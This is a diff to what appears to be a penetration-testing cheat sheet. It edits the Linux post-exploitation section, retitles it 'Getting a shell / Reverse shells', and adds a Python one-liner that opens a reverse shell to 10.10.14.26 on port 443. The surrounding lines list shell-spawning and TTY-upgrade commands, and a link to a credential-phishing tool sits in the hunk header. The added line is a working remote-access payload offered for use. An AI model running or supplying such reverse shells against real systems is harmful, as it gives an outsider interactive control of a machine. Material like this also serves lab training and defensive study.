@@ -444,12 +444,13 @@ https://github.com/tokyoneon/CredPhish
 
 # Post Exploitation
 # Linux
-Getting a shell
+Getting a shell / Reverse shells
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
 perl -e 'exec "/bin/sh";'
